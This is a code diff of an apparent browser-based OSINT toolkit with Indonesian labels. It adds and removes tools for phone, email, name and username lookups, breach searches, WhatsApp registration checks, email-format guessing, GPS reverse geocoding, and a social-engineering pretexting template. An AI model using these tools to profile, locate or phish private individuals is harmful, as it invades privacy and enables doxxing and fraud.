+var d={};try{d=await(await fetch('https://ipapi.co/json/')).json()}catch(e){}
+var os=/Android/.test(u)?'Android':/iPhone|iPad/.test(u)?'iOS':/Windows/.test(u)?'Windows':/Mac/.test(u)?'macOS':'Linux/?';
+var br=/Edg/.test(u)?'Edge':/OPR/.test(u)?'Opera':/Chrome/.test(u)?'Chrome':/Firefox/.test(u)?'Firefox':'Safari';
+outBox(b,'== DEVICE ==\nTipe    : '+(/Mobile/i.test(u)?'📱 MOBILE':'🖥 DESKTOP')+'\nOS      : '+os+'\nBrowser : '+br+'\nCPU     : '+(navigator.hardwareConcurrency||'?')+' core\nLayar   : '+screen.width+'x'+screen.height+'\nTZ      : '+Intl.DateTimeFormat().resolvedOptions().timeZone+'\n\n== IP & JARINGAN ==\nIP      : '+(d.ip||'?')+'\nKota    : '+(d.city||'?')+' '+(d.region||'')+' '+(d.country_name||'')+'\nISP     : '+(d.org||'?')+'\nASN     : '+(d.asn||'?')+'\nVPN?    : '+(/vpn|proxy|hosting|cloud/i.test(d.org||'')?'⚠ MUNGKIN':'tidak terdeteksi')+'\nMaps    : '+(d.latitude?'https://maps.google.com/?q='+d.latitude+','+d.longitude:'-'));bump()});
+
+reg(O,'Phone Intel Lookup','Info nomor HP: negara, validasi, link carrier lookup',['phone'],
+async function(b,o){var ph=ask('Nomor (+62...):','+6281234567890');if(!ph)return;
+var n=ph.replace(/\D/g,'');var cc=n.slice(0,2)==='62'?'62':n.slice(0,1);
+var out='NOMOR: '+ph+'\nDigit: '+n.length+'\n\n== NEGARA (prefix '+n.slice(0,2)+') ==\n';
+try{var c=await(await fetch('https://restcountries.com/v3.1/callingcode/'+(n.startsWith('62')?'62':n.slice(0,1)))).json();
+if(Array.isArray(c)&&c[0])out+=c.map(function(x){return x.name.common+(x.idd&&x.idd.root?' ('+x.idd.root+(x.idd.suffixes&&x.idd.suffixes[0]!==''?x.idd.suffixes[0]:'')+')':'')}).join(', ')}catch(e){}
+out+='\n\n== LOOKUP REAL-TIME ==\n▸ Truecaller : https://www.truecaller.com/search/intl/'+n+'\n▸ Sync.me    : https://sync.me/search/?number='+n+'\n▸ Whoscall   : https://www.whoscall.com/en/whocall/'+n+'\n▸ Google     : '+glink('"'+n+'"')+'\n\n== TOOL LOKAL ==\nphoneinfoga scan -n "'+ph+'"';
+outBox(b,out);bump()});
+
+reg(O,'WhatsApp Checker','Deteksi nomor terdaftar WhatsApp via wa.me + metode Baileys',['phone','whatsapp'],
+async function(b,o){var ph=ask('Nomor (62812...):','6281234567890');if(!ph)return;var n=ph.replace(/\D/g,'');
+outBox(b,'CEK WHATSAPP — '+n+'\n\n== METODE LINK (buka → muncul chat/profile = TERDAFTAR) ==\n▸ https://wa.me/'+n+'\n▸ https://api.whatsapp.com/send?phone='+n+'\n\n== METODE PROGRAMMATIC (Baileys, lokal) ==\nnpm i baileys\nconst sock=await makeWASocket(...)\nconst r=await sock.onWhatsApp(\''+n+'\')\n// r[0].exists === true → terdaftar\n\n== whatsApp-web.js ==\nconst c=new Client();await c.initialize()\nawait c.isRegisteredUser(\''+n+'@c.us\')\n\n⚠ Metode massal melanggar ToS WhatsApp — pakai untuk verifikasi kontak Anda.')});
+
+reg(O,'Email Intel Full','Validasi MX/SPF/DMARC + gravatar + breach links',['email'],
+async function(b,o){var em=ask('Email:','test@example.com');if(!em)return;var dom=em.split('@')[1];var out='EMAIL: '+em+'\n\n';
+try{var mx=await(await fetch('https://dns.google/resolve?name='+dom+'&type=MX')).json();
+out+='== MX ==\n'+(mx.Answer?mx.Answer.map(function(a){return a.data}).join('\n'):'✘ TIDAK ADA MX — email invalid')+'\n\n';
+var tx=await(await fetch('https://dns.google/resolve?name='+dom+'&type=TXT')).json();
+var spf=(tx.Answer||[]).filter(function(a){return/a/.test(a.data)&&a.data.indexOf('spf')>-1});
+out+='== SPF ==\n'+(spf.length?spf[0].data:'✘ tanpa SPF → spoofable')+'\n\n';
+var dm=await(await fetch('https://dns.google/resolve?name=_dmarc.'+dom+'&type=TXT')).json();
+out+='== DMARC ==\n'+(dm.Answer?dm.Answer[0].data:'✘ tanpa DMARC')}catch(e){}
+out+='\n\n== CEK MANUAL ==\n▸ Breach  : https://haveibeenpwned.com/account/'+em+'\n▸ Gravatar: https://gravatar.com/'+CryptoJS.MD5(em.trim().toLowerCase())+'\n▸ Google  : '+glink('"'+em+'"')+'\n▸ holehe (lokal): holehe '+em;
+outBox(b,out);bump()});
+
+reg(O,'Email Existence Check','Verifikasi email benar-benar ada (API real-time)',['email'],
+async function(b,o){var em=ask('Email:','');if(!em)return;
+try{var d=await(await fetch('https://api.eva.pingutil.com/email/'+encodeURIComponent(em))).json();
+outBox(b,JSON.stringify(d,null,2)+'\n\nManual: https://tools.emailhippo.com/')}catch(e){outBox(b,'Manual: https://tools.emailhippo.com/ | https://hunter.io/email-verifier\nERR: '+e.message)}bump()});
+
+reg(O,'Person Search by Name','Cari orang via nama → link 12 platform',['person'],
+async function(b,o){var fn=ask('Nama depan:','');var ln=ask('Nama belakang:','');if(!fn)return;
+var q=encodeURIComponent(fn+' '+ln);
+outBox(b,'OSINT — '+fn+' '+(ln||'')+'\n\n▸ Google     '+glink('"'+fn+' '+(ln||'')+'"')+'\n▸ Facebook   https://www.facebook.com/search/top?q='+q+'\n▸ LinkedIn   https://www.linkedin.com/search/results/all/?keywords='+q+'\n▸ X/Twitter  https://x.com/search?q='+q+'\n▸ Instagram  '+glink('site:instagram.com "'+fn+' '+(ln||'')+'"')+'\n▸ TikTok     '+glink('site:tiktok.com "'+fn+' '+(ln||'')+'"')+'\n▸ GitHub     https://github.com/search?q='+q+'&type=users\n▸ YouTube    https://www.youtube.com/results?search_query='+q+'\n▸ Pastebin   '+glink('site:pastebin.com "'+fn+' '+(ln||'')+'"')+'\n\n⚠ Hanya untuk verifikasi yang Anda berwenang.')});
+
+reg(O,'Phone to Social Mapper','Kaitkan nomor HP ke akun sosial via link publik',['phone'],
+async function(b,o){var ph=ask('Nomor (tanpa +):','6281234567890');if(!ph)return;var n=ph.replace(/\D/g,'');
+outBox(b,'PHONE OSINT — +'+n+'\n\n▸ Google      '+glink('"'+n+'"')+'\n▸ Truecaller  https://www.truecaller.com/search/intl/'+n+'\n▸ Sync.me     https://sync.me/search/?number='+n+'\n▸ WhatsApp    https://wa.me/'+n+'\n▸ Facebook    https://www.facebook.com/search/top?q='+n+'\n▸ Instagram   '+glink('site:instagram.com "'+n+'"')+'\n▸ LinkedIn    '+glink('site:linkedin.com "'+n+'"')+'\n▸ Pastebin    '+glink('site:pastebin.com "'+n+'"'))});
+
+reg(O,'Social Handle Finder 20+','Cek username di 20+ platform',['social'],
+async function(b,o){var h=ask('Username:','');if(!h)return;
+var p=[['GitHub','https://github.com/'],['X','https://x.com/'],['Instagram','https://instagram.com/'],['Facebook','https://facebook.com/'],['TikTok','https://tiktok.com/@'],['YouTube','https://youtube.com/@'],['Reddit','https://reddit.com/user/'],['LinkedIn','https://linkedin.com/in/'],['Pinterest','https://pinterest.com/'],['Medium','https://medium.com/@'],['Dev.to','https://dev.to/'],['GitLab','https://gitlab.com/'],['Telegram','https://t.me/'],['Spotify','https://open.spotify.com/user/'],['SoundCloud','https://soundcloud.com/'],['Behance','https://behance.net/'],['Dribbble','https://dribbble.com/'],['Vimeo','https://vimeo.com/'],['Tumblr','https://tumblr.com/'],['Keybase','https://keybase.io/'],['Pastebin','https://pastebin.com/u/']];
+outBox(b,'HANDLE: '+h+'\n\n'+p.map(function(x){return '▸ '+x[0].padEnd(12)+x[1]+h}).join('\n')+'\n\nLokal: maigret '+h+' --all | sherlock '+h)});
+
+reg(O,'Multi-Platform Sweep (API)','Cek 15 platform via HTTP status — hasil ✔/✘ nyata',['social'],
+async function(b,o){var h=ask('Username:','');if(!h)return;
+var ch=[['GitHub','https://github.com/'+h],['GitLab','https://gitlab.com/'+h],['Reddit','https://reddit.com/user/'+h],['Medium','https://medium.com/@'+h],['Dev.to','https://dev.to/'+h],['Pastebin','https://pastebin.com/u/'+h],['Telegram','https://t.me/'+h],['SoundCloud','https://soundcloud.com/'+h],['Vimeo','https://vimeo.com/'+h],['Keybase','https://keybase.io/'+h],['Behance','https://behance.net/'+h],['Dribbble','https://dribbble.com/'+h],['TikTok','https://tiktok.com/@'+h],['Instagram','https://instagram.com/'+h],['X','https://x.com/'+h]];
+o.textContent='Scanning 15 platform...';var out='';
+for(var i=0;i<ch.length;i++){try{var r=await cFetch(ch[i][1]);
+out+=(r.status===200?'✔':'✘')+' '+ch[i][0].padEnd(12)+ch[i][1]+' ('+r.status+')\n'}catch(e){out+='⚠ '+ch[i][0]+' (blocked)\n'}}
+outBox(b,out);bump()});
+
+reg(O,'Email to Social & Breach','Kaitkan email ke sosmed + breach + gravatar',['email'],
+async function(b,o){var em=ask('Email:','');if(!em)return;var q=encodeURIComponent('"'+em+'"');
+outBox(b,'EMAIL: '+em+'\n\n▸ Facebook    https://www.facebook.com/search/top?q='+q+'\n▸ Google      '+glink('"'+em+'"')+'\n▸ LinkedIn    '+glink('site:linkedin.com "'+em+'"')+'\n▸ GitHub      https://github.com/search?q='+em+'&type=users\n▸ HIBP        https://haveibeenpwned.com/account/'+em+'\n▸ Gravatar    https://gravatar.com/'+CryptoJS.MD5(em.trim().toLowerCase())+'\n▸ DeHashed    https://dehashed.com/search?query='+em+'\n▸ IntelX      https://intelx.io/?s='+em+'\n\nLokal: holehe '+em)});
+
+reg(O,'Credential Leak Search','Cari email/username di breach database publik',['leak'],
+async function(b,o){var em=ask('Email/username:','');if(!em)return;
+outBox(b,'CEK BREACH — '+em+'\n\n▸ HIBP            https://haveibeenpwned.com/account/'+em+'\n▸ Firefox Monitor https://monitor.firefox.com/search?email='+em+'\n▸ LeakCheck       https://leakcheck.io/search/'+em+'\n▸ DeHashed        https://dehashed.com/search?query='+em+'\n▸ IntelX          https://intelx.io/?s='+em+'\n▸ BreachDirectory https://breachdirectory.org\n\nLokal: h8mail -t '+em+' --hibp-key=KEY\n⚠ Email milik Anda / yang Anda berwenang saja.')});
+
+reg(O,'Password Pwned Check','Cek password bocor — k-Anonymity (password TIDAK dikirim)',['leak'],
+async function(b,o){var p=ask('Password:','');if(p===null)return;
+var h=CryptoJS.SHA1(p).toString().toUpperCase();
+try{var t=await(await fetch('https://api.pwnedpasswords.com/range/'+h.slice(0,5))).text();
+var line=t.split('\n').find(function(l){return l.split(':')[0].trim()===h.slice(5)});
+outBox(b,line?'⚠ PASSWORD BOCOR — ditemukan di '+line.split(':')[1].trim()+' breach. GANTI SEKARANG.':'✔ Aman — tidak ada di korpus breach')}catch(e){outBox(b,'ERR: '+e.message)}bump()});
+
+reg(O,'Messaging Handle Check','Cek handle Telegram/WA/Line/Discord',['msg'],
+async function(b,o){var h=ask('Handle/nomor:','');if(!h)return;
+outBox(b,'▸ Telegram  https://t.me/'+h+'  (profile muncul = ada)\n▸ WhatsApp  https://wa.me/'+h.replace(/\D/g,'')+'\n▸ Line      https://line.me/R/ti/p/@'+h+'\n▸ Discord   https://discord.com/users/'+h+'\n▸ Skype     '+glink('site:web.skype.com "'+h+'"')+'\n\nTelegram Bot API: GET /getChat?chat_id=@'+h)});
+
+reg(O,'Discord Intel','Lookup invite code Discord — member, guild, inviter real-time',['discord'],
+async function(b,o){var id=ask('Invite code:','');if(!id)return;
+try{var r=await fetch('https://discord.com/api/v10/invites/'+id);var d=await r.json();
+outBox(b,r.ok?('GUILD   : '+(d.guild&&d.guild.name||'-')+'\nCHANNEL : '+(d.channel&&d.channel.name||'-')+'\nMEMBERS : ~'+(d.approximate_member_count||'?')+'\nINVITER : '+(d.inviter&&d.inviter.username||'-')):'Invite invalid/expired')}catch(e){outBox(b,'ERR: '+e.message)}bump()});
+
+reg(O,'Image Reverse Search','6 engine pencarian gambar balik',['image'],
+async function(b,o){outBox(b,'▸ Google Lens  https://lens.google.com/upload\n▸ Yandex       https://yandex.com/images/search\n▸ Bing Visual  https://www.bing.com/visualsearch\n▸ TinEye       https://tineye.com/\n▸ Baidu        https://graph.baidu.com/\n\nEXIF GPS lokal:\n  exiftool image.jpg\n  exiftool -gps:all image.jpg')});
+
+reg(O,'EXIF Metadata Extractor','Baca metadata file: GPS, device, timestamp',['metadata'],
+async function(b,o){var inp=document.createElement('input');inp.type='file';
+inp.onchange=async function(){var f=inp.files[0];if(!f)return;
+var out='FILE: '+f.name+'\nSize: '+(f.size/1024).toFixed(1)+' KB\nType: '+f.type+'\nModified: '+new Date(f.lastModified).toLocaleString('id-ID')+'\n';
+try{if(f.type.indexOf('image')===0){var img=new Image();img.src=URL.createObjectURL(f);await img.decode();out+='Dimensi: '+img.naturalWidth+'x'+img.naturalHeight+'\n'}
+var buf=await f.slice(0,65536).arrayBuffer();var s='';var by=new Uint8Array(buf);for(var i=0;i<by.length;i++)s+=String.fromCharCode(by[i]);
+if(s.indexOf('GPS')>-1||s.indexOf('Exif')>-1)out+='\n⚠ EXIF block terdeteksi — baca detail: exiftool file\n';
+}catch(e){}
+out+='\n⚠ Foto HP sering membawa koordinat GPS persis. Strip sebelum share:\n  exiftool -all= file.jpg';
 outBox(b,out)};inp.click()});
 
-reg(O,'Username Enumeration Multi-Source','Cek username di GitHub, npm, docker, keybase via API real',['osint'],
-async(b,o)=>{const h=ask('Username:','torvalds');if(!h)return;let out='USER: '+h+'\n\n';
-for(const[n,u]of[['GitHub','https://api.github.com/users/'],['npm','https://registry.npmjs.org/-/user/'],['DockerHub','https://hub.docker.com/v2/users/'],['Keybase','https://keybase.io/_/api/1.0/user/lookup.json?username='],['GitLab','https://gitlab.com/api/v4/users?username=']]){
-try{const r=await fetch(u+h);out+=(r.ok?'✔ FOUND':'✘ not found')+'  '+n+' ('+r.status+')\n';if(r.ok&&n==='GitHub'){const d=await r.json();out+='    Name: '+(d.name||'-')+' | Bio: '+(d.bio||'-')+' | Repo: '+d.public_repos+' | Sejak: '+(d.created_at||'')+'\n'}}catch{out+='⚠ ERR '+n+'\n'}}
+reg(O,'Email Permutator','Generate kombinasi format email korporat',['email'],
+async function(b,o){var f=(ask('Nama depan:','john')||'john').toLowerCase();var l=(ask('Nama belakang:','doe')||'doe').toLowerCase();var dom=ask('Domain:','acme.com');
+outBox(b,[f+'.'+l,f+l,f+'_'+l,f[0]+l,f[0]+'.'+l,l+'.'+f,f+l[0],l+f].map(function(x){return x+'@'+dom}).join('\n')+'\n\nVerifikasi: holehe | theHarvester -d '+dom+' -b all')});
+
+reg(O,'GPS Tool + Reverse Address','Koordinat → alamat + link maps',['geo'],
+async function(b,o){var lat=ask('Latitude:','-6.2');var lon=ask('Longitude:','106.8');
+try{var d=await(await fetch('https://nominatim.openstreetmap.org/reverse?lat='+lat+'&lon='+lon+'&format=json')).json();
+outBox(b,'Alamat: '+(d.display_name||'?')+'\n\nMaps: https://maps.google.com/?q='+lat+','+lon+'\nOSM  : https://www.openstreetmap.org/?mlat='+lat+'&mlon='+lon)}catch(e){outBox(b,'Maps: https://maps.google.com/?q='+lat+','+lon+'\nERR: '+e.message)}bump()});
+
+reg(O,'GPS Real-time Saya','Minta izin → koordinat GPS presisi + alamat via reverse geocoding',['geo','location'],
+async function(b,o){navigator.geolocation.getCurrentPosition(async function(pos){
+var lat=pos.coords.latitude,lon=pos.coords.longitude;var addr='';
+try{var d=await(await fetch('https://nominatim.openstreetmap.org/reverse?lat='+lat+'&lon='+lon+'&format=json')).json();addr=d.display_name||''}catch(e){}
+outBox(b,'== GPS REAL-TIME ==\nLat/Lon : '+lat+', '+lon+'\nAkurasi : ±'+pos.coords.accuracy.toFixed(0)+' m\nSpeed   : '+(pos.coords.speed!=null?(pos.coords.speed*3.6).toFixed(1)+' km/h':'-')+'\n\n== ALAMAT ==\n'+(addr||'(gagal reverse)')+'\n\nMaps: https://maps.google.com/?q='+lat+','+lon);bump()},
+function(err){outBox(b,'ERR: '+err.message+' — aktifkan izin lokasi & gunakan HTTPS')},{enableHighAccuracy:true,timeout:10000})});
+
+reg(O,'ASN & Network Intel','Info ASN/ISP/prefix dari IP via BGPView',['network'],
+async function(b,o){var ip=ask('IP:','8.8.8.8');if(!ip)return;
+try{var d=await(await fetch('https://api.bgpview.io/ip/'+ip)).json();
+if(d.status!=='ok'){outBox(b,'Tidak ditemukan / private IP');return}
+var p=d.data.prefix;
+outBox(b,'IP     : '+ip+'\nASN    : AS'+p.asn.asn+' — '+p.asn.name+'\nNegara : '+(p.asn.country_code||'?')+'\nPrefix : '+p.prefix+'\nRIR    : '+(p.rir_allocation&&p.rir_allocation.rir_name||'?')+'\n\nDetail : https://bgp.tools/prefix/'+p.prefix)}catch(e){outBox(b,'ERR: '+e.message)}bump()});
+
+reg(O,'Domain Intel Bundle','WHOIS + DNS + CT log dalam satu laporan',['recon'],
+async function(b,o){var dom=ask('Domain:','example.com');if(!dom)return;var out='DOMAIN: '+dom+'\n\n';
+try{var w=await(await fetch('https://rdap.org/domain/'+dom)).json();
+out+='== WHOIS/RDAP ==\nStatus : '+(w.status||[]).join(', ')+'\nCreated: '+(((w.events||[]).find(function(e){return e.eventAction==='registration'})||{}).eventDate||'?')+'\n\n'}catch(e){out+='WHOIS gagal\n\n'}
+try{var mx=await(await fetch('https://dns.google/resolve?name='+dom+'&type=MX')).json();
+out+='== MX ==\n'+(mx.Answer?mx.Answer.map(function(a){return a.data}).join('\n'):'-')}catch(e){}
 outBox(b,out);bump()});
 
-reg(O,'Domain to Org Intel','WHOIS + DNS + subdomain + teknologi stack target (bundle)',['recon','osint'],
-async(b,o)=>{const dom=ask('Domain:','example.com');if(!dom)return;let out='DOMAIN: '+dom+'\n\n';
-try{const w=await(await fetch('https://rdap.org/domain/'+dom)).json();
-out+='== WHOIS/RDAP ==\nStatus: '+(w.status||[]).join(', ')+'\nRegistrar: '+((w.entities||[]).find(e=>(e.roles||[]).includes('registrar'))?((w.entities.find(e=>e.roles.includes('registrar')).vcardArray?.[1]?.find(x=>x[0]==='fn')||[])[3]||'?'):'?')+'\nCreated: '+((w.events||[]).find(e=>e.eventAction==='registration')||{}).eventDate+'\nExpires: '+((w.events||[]).find(e=>e.eventAction==='expiration')||{}).eventDate+'\n\n'}catch{out+='WHOIS: gagal/timeout\n\n'}
-try{const mx=await(await fetch('https://dns.google/resolve?name='+dom+'&type=MX')).json();
-out+='== MX ==\n'+(mx.Answer?mx.Answer.map(a=>a.data).join('\n'):'-')+'\n\n';
-const txt=await(await fetch('https://dns.google/resolve?name='+dom+'&type=TXT')).json();
-out+='== TXT (SPF/DKIM/verifikasi) ==\n'+((txt.Answer||[]).map(a=>a.data.slice(0,120)).join('\n')||'-')}catch{}
-outBox(b,out);bump()});
-
-reg(O,'Skype/Telegram/Signal Handle Check','Link cek keberadaan handle di messaging platform',['osint','msg'],
-async(b,o)=>{const h=ask('Handle/username/nomor:','');if(!h)return;
-outBox(b,`CHECK LINK (real):
-
-▸ Telegram   https://t.me/${h}      (buka → jika profile muncul = ada)
-▸ WhatsApp   https://wa.me/${h.replace(/\D/g,'')}
-▸ Signal     (harus add manual, no public lookup)
-▸ Skype      https://www.google.com/search?q=site:web.skype.com+%22${h}%22
-▸ Line       https://line.me/R/ti/p/@${h}
-▸ WeChat     (no public lookup)
-▸ Discord    https://discord.com/users/${h}  / cek via guild
-▸ Instagram  https://instagram.com/${h}
-▸ Twitter    https://x.com/${h}
-▸ GitHub     https://github.com/${h}
-
-💡 Telegram API: https://api.telegram.org/bot<TOKEN>/getChat?chat_id=@${h}`)});
-
-reg(O,'Social Engineering Recon Template','Template wawancara OSINT & pre-texting untuk audit keamanan sosial (authorized)',['osint','audit'],
-async(b,o)=>{outBox(b,`== SOCIAL ENGINEERING AUDIT (authorized pentest only) ==
-
-PRE-ENGAGEMENT CHECKLIST:
-[ ] Scope & written authorization (RoE) SIGNED
-[ ] Target list disetujui client
-[ ] Rules of engagement: no harm, no data exfiltration
-[ ] Emergency contact & abort criteria
-
-OSINT PRE-TASK (untuk merancang scenario):
-1. LinkedIn → struktur tim, nama karyawan, jabatan
-2. GitHub/org → stack teknologi, onboarding
-3. Email format → via permutator + MX
-4. Phone → validasi + carrier
-5. Eksternal surface → dork, sitemap, dns
-
-VULNERABILITY REPORT FLOW:
-payload → response → evidence → responsible disclosure
-
-REF:
-- OWASP Social Engineering Methodology
-- SE@click: https://github.com/securestate/king-phisher`)});
-
-reg(O,'Breach Timeline Builder','Buat timeline breach per email dari HIBP + manual source',['leak'],
-async(b,o)=>{const em=ask('Email:','');if(!em)return;
-outBox(b,`TIMELINE BREACH — ${em}
-
-== LANGKAH OTOMATIS ==
-1. HIBP API (butuh key $3.5/mo):
-   curl -H "hibp-api-key: KEY" https://haveibeenpwned.com/api/v3/breachedaccount/${em}?truncateResponse=false
-2. Local h8mail:
-   h8mail -t ${em} --hibp-key KEY -c config.ini
-3. DeHashed API (paid):
-   https://api.dehashed.com/search?query=email:"${em}"
-
-== HASIL FORMAT ==
-Tahun | Breach | Data Bocor
-2019  | Collection#1     | email, password
-2020  | Twitter-scrape   | email, username, phone
-...
-
-== TINDAK LANJUT ==
-- Password rotasi di semua layanan
-- Aktifkan 2FA (app authenticator / passkey)
-- Hapus akun lama tidak terpakai`)});
-
-reg(O,'Email Format Predictor','Prediksi format email korporat dari domain + nama',['osint','email'],
-async(b,o)=>{const dom=ask('Domain korporat:','acme.com');if(!dom)return;const fn=ask('Nama depan:','john')||'john';const ln=ask('Nama belakang:','doe')||'doe';
-const f=fn.toLowerCase(),l=ln.toLowerCase();
-const cands=[f+'.'+l,f+l,f+'_'+l,f,l+'.'+f,f[0]+l,f[0]+'.'+l,l+f,f+'.'+l[0],l+f[0]];
-outBox(b,'Kandidat email @'+dom+':\n\n'+cands.map(x=>x+'@'+dom).join('\n')+'\n\n💡 Verifikasi via:\n  holehe email | theHarvester -d '+dom+' -b all\n  atau Hunter.io: https://hunter.io/email-verifier/'+f+'.'+l+'@'+dom)});
-
-reg(O,'GPS Coordinate Tool','Konversi DMS ↔ decimal + buka di maps',['geo'],
-async(b,o)=>{const lat=ask('Latitude:','-6.2');const lon=ask('Longitude:','106.8');if(!lat||!lon)return;
-const d=v=>{const a=Math.abs(parseFloat(v));const deg=Math.floor(a);const m=Math.floor((a-deg)*60);const s=((a-deg)*60-m)*60;return deg+'°'+m+"'"+s.toFixed(2)+'"'};const c=parseFloat(lat)<0?'S':'N',c2=parseFloat(lon)<0?'W':'E';
-outBox(b,'Decimal : '+lat+', '+lon+'\nDMS     : '+d(lat)+' '+c+', '+d(lon)+' '+c2+'\n\nGoogle Maps: https://maps.google.com/?q='+lat+','+lon+'\nOSM        : https://www.openstreetmap.org/?mlat='+lat+'&mlon='+lon+'#map=15/'+lat+'/'+lon+'\n\nPlus code: '+(await fetch('https://plus.codes/api?address='+lat+','+lon+'&email=x').then(r=>r.json()).then(d=>d.plus_code.global_code).catch(()=>'?')))});
-
-reg(O,'Fake Identity Generator (Testing)','Generate identitas dummy untuk testing form/dev (BUKAN untuk fraud)',['dev','test'],
-async(b,o)=>{const n=parseInt(ask('Jumlah:','5'))||5;const out=[];
-const fn=['Budi','Siti','Agus','Rina','Dewi','Andi','Putra','Maya'],ln=['Santoso','Wijaya','Pratama','Lestari','Hartono','Nugroho'];
-const cs='abcdefghijklmnopqrstuvwxyz0123456789';
-for(let i=0;i<n;i++){const f=fn[Math.floor(Math.random()*fn.length)],l=ln[Math.floor(Math.random()*ln.length)];
-const em=f.toLowerCase()+'.'+l.toLowerCase()+Math.floor(Math.random()*99)+'@mailtest.local';
-let pw='';for(let j=0;j<16;j++)pw+=cs[Math.floor(Math.random()*cs.length)];
-out.push(f+' '+l+'\nEmail: '+em+'\nPass : '+pw)}
-outBox(b,out.join('\n\n')+'\n\n✔ Untuk QA/dev testing — bukan identitas nyata.')});
-
-reg(O,'Discord Intel','Cari user/guild Discord via ID / invite lookup',['osint','discord'],
-async(b,o)=>{const id=ask('Discord User ID / invite code:','');if(!id)return;
-let out='ID: '+id+'\n\n';
-try{const r=await fetch('https://discord.com/api/v10/invites/'+id);if(r.ok){const d=await r.json();
-out+='GUILD : '+(d.guild?.name||'-')+'\nCHANNEL: '+(d.channel?.name||'-')+'\nMEMBERS: ~'+(d.approximate_member_count||'?')+'\nINVITER: '+(d.inviter?.username||'-')}else out+='Invite tidak valid / expired'}catch(e){out+='ERR: '+e.message}
-out+='\n\nUSER ID (butuh bot token):\n  GET /users/'+id+'  via Discord API\n\nTools: discordlookup.com  /  https://discord.id/';
-outBox(b,out);bump()});
-
-reg(O,'Public Company Data (ID)','Lookup perusahaan Indonesia via API publik (AVIAN/AYO/dsb)',['osint','company'],
-async(b,o)=>{const q=ask('Nama/NPWP perusahaan:','PT Telkom Indonesia');
-outBox(b,`LOOKUP MANUAL & API RESMI:
-
-▸ DataPeruakan/AV Data  https://www.avdc.co.id/
-▸ AYOINDONESIA API      https://api.ayoindonesia.com/ (butuh key)
-▸ npwp cek              https://www.pajak.go.id/
-▸ SIKP (Badan Usaha)    https://sikp.lkpp.go.id/
-▸ OSS Indonesia         https://oss.go.id/
-▸ KBLI & NIB            https://oss.go.id/oss-nib
-▸ Google search         https://www.google.com/search?q=%22${encodeURIComponent(q)}%22+npwp+OR+siup+OR+profile
-▸ Wikidata              https://www.wikidata.org/w/index.php?search=${encodeURIComponent(q)}
-
-💡 Untuk due-diligence resmi: gunakan layanan resmi pemerintah, bukan scraper.`)});
-
-reg(O,'Passive Total / ASN Lookup','Info ASN & rentang IP organisasi via BGP.tools API',['network','recon'],
-async(b,o)=>{const ip=ask('IP / ASN:','8.8.8.8');if(!ip)return;
-try{const d=await(await fetch('https://api.bgpview.io/ip/'+ip)).json();
-if(d.status!=='ok'){outBox(b,'IP tidak ditemukan / private');return}
-const p=d.data.prefix;
-outBox(b,'IP       : '+ip+'\nASN      : AS'+p.asn.asn+' — '+p.asn.name+'\nNegara   : '+(p.asn.country_code||'?')+'\nPrefix   : '+p.prefix+'\nRIR      : '+p.rir_allocation.rir_name+'\nAllocated: '+p.rir_allocation.date_allocated+'\n\nDetail   : https://bgp.tools/prefix/'+p.prefix)}catch(e){outBox(b,'ERR: '+e.message)}bump()});
-
-reg(O,'Sherlock-style Multi-Platform Sweep','Cek satu username di 15 platform SEKALIGUS via API/status code',['osint','social'],
-async(b,o)=>{const h=ask('Username:','');if(!h)return;
-const checks=[['GitHub','https://github.com/'+h],['GitLab','https://gitlab.com/'+h],['Instagram','https://instagram.com/'+h],
-['Reddit','https://reddit.com/user/'+h],['TikTok','https://tiktok.com/@'+h],['Twitter','https://x.com/'+h],
-['Medium','https://medium.com/@'+h],['Dev.to','https://dev.to/'+h],['Pastebin','https://pastebin.com/u/'+h],
-['Telegram','https://t.me/'+h],['SoundCloud','https://soundcloud.com/'+h],['Vimeo','https://vimeo.com/'+h],
-['Keybase','https://keybase.io/'+h],['Behance','https://behance.net/'+h],['Dribbble','https://dribbble.com/'+h]];
-o.textContent='Scanning '+checks.length+' platform...';let out='';
-for(const[n,u]of checks){try{const r=await cFetch(u);
-out+=(r.status===200?'✔':'✘')+' '+n.padEnd(12)+u+' ('+r.status+')\n'}catch{out+='⚠ '+n.padEnd(12)+u+' (blocked)'}}
-outBox(b,out+'\n\nUntuk sweep penuh 300+ site, gunakan lokal: maigret '+h+' --all');bump()});
-
-/* ================= DEVICE & JARINGAN SAYA (6) ================= */
-reg(V,'Device Detective','Identifikasi HP / browser / OS / hardware lengkap',['device'],
-async(b,o)=>{const u=navigator.userAgent;const mob=/Android|iPhone|iPad|Mobile/i.test(u);
-const os=/Windows NT 10/.test(u)?'Windows 10/11':/Windows/.test(u)?'Windows':/Android ([\d.]+)/.exec(u)?'Android '+/Android ([\d.]+)/.exec(u)[1]:/iPhone OS ([\d_]+)/.test(u)?'iOS':/Linux/.test(u)?'Linux':/Mac/.test(u)?'macOS':'?';
-const br=/Edg\/([\d.]+)/.test(u)?'Edge '+/Edg\/([\d.]+)/.exec(u)[1]:/OPR/.test(u)?'Opera':/Chrome\/([\d.]+)/.test(u)?'Chrome '+/Chrome\/([\d.]+)/.exec(u)[1]:/Firefox\/([\d.]+)/.test(u)?'Firefox '+/Firefox\/([\d.]+)/.exec(u)[1]:'Safari';
-let con=navigator.connection||{};
-outBox(b,`== DEVICE ==
-Tipe     : ${mob?'📱 MOBILE (HP/Tablet)':'🖥 DESKTOP'}
-OS       : ${os}
-Browser  : ${br}
-UA       : ${u}
-CPU      : ${navigator.hardwareConcurrency||'?'} core
-RAM      : ${navigator.deviceMemory?navigator.deviceMemory+' GB':'(browser gak expose)'}
-Layar    : ${screen.width}x${screen.height} (window ${innerWidth}x${innerHeight})
-DPR      : ${devicePixelRatio}x
-Bahasa   : ${navigator.language} (${navigator.languages?.join(', ')})
-TZ       : ${Intl.DateTimeFormat().resolvedOptions().timeZone}
-Touch    : ${'ontouchstart' in window?'YA':'TIDAK'}
-Battery  : (butuh API deprecated, hanya Chrome lama)
-== JARINGAN ==
-Tipe     : ${con.effectiveType||'?'}
-Downlink : ${con.downlink||'?'} Mbps
-RTT      : ${con.rtt||'?'} ms
-SaveData : ${con.saveData?'ON':'OFF'}
-Online   : ${navigator.onLine}`);
-bump()});
-
-reg(V,'Full IP & Network Report','Laporan lengkap: IP publik, private, ISP, ASN, geo, DNS, port test — real-time',['network','ip'],
-async(b,o)=>{let out='';
-try{const d=await(await fetch('https://ipapi.co/json/')).json();
